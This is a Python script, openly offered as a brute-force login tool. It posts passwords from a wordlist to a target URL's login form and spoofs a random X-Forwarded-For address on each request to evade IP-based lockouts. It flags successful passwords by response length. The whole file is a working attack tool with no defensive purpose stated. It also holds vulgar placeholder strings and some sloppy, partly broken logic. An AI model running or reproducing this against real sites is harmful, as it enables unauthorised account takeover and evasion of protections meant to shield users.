import argparse
import sys
import requests
from random import *

parser = argparse.ArgumentParser(description="Python Bruteforce Login")
parser.add_argument('--url', help="Website to target", required=True)
parser.add_argument('-user', help="User to BruteForce", required=True)
parser.add_argument('--ufield', help="Field of User in Petition", required=False)
parser.add_argument('--pfield', help="Field of Password in Petition", required=False)
parser.add_argument('--wordlist', help="Wordlist of passwords to use", required=True)
parser.add_argument('--agent', help="User agent string to send the login as", default="Agent:Mozilla/5.0")
parser.add_argument('--hl', help="Hide Results Via Content-Lenght ", required=False)

args = parser.parse_args()

class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR

proxy = {
  'http': 'http://127.0.0.1:8080',
}

global op1
global op2
op1 = 1
op2 = 255

global a
a = 1
def load_words(WORDLIST_FILENAME):
       global line
       print("Starting BruteForce Attack...")
       print("Working...")
       wordlist = list()
       with open(WORDLIST_FILENAME) as f:
            for line in f:
                wordlist.append(wordlist)
                my_str=line
                final_str=my_str[:-1]
                ppp = {'username': "follando_con",'password': "dragones",'user': "enun",'pass': "portal"}
                uuuuuu = requests.post(args.url,data=ppp)
                b = randint(op1, op2)
                c = randint(op1, op2)
                d = randint(op1, op2)
                e = randint(op1, op2)
                bb = str(b)
                cc = str(c)
                dd = str(d)
                ee = str(e)
                pp = {'username': args.user,'password': final_str,'user': args.user,'pass': final_str,args.ufield: args.user,args.pfield: final_str}
                dot = "."
                ip = bb+dot+cc+dot+dd+dot+ee
                ip2 = str(ip)
                headers = {
                'X-Forwarded-For': ip2,
}
                resp = requests.post(args.url,data=pp,proxies=False,headers=headers)
                polla = len(resp.content)
                bbb = resp.status_code
                arr = len(resp.content)
                aaaas = len(resp.content)
                if args.hl == None:
                  if args.hl == aaaas:
                    pass
                    print(polla)
                  else:
                    if arr != len(uuuuuu.content):
                      print(f"{bcolors.OK}[+] Password:{bcolors.RESET}",final_str,"=",f"{bcolors.OK}Content Lenght:{bcolors.RESET}",polla)
                    elif bbb == 404:
                      a + 1
                    else:
                      a + 1
                else:
                  if len(uuuuuu.content) == polla:
                    pass
                  else:
                    print(f"{bcolors.OK}[+] Password:{bcolors.RESET}",final_str,"= Content Lenght:",polla)

                  
wordlist = load_words(args.wordlist)
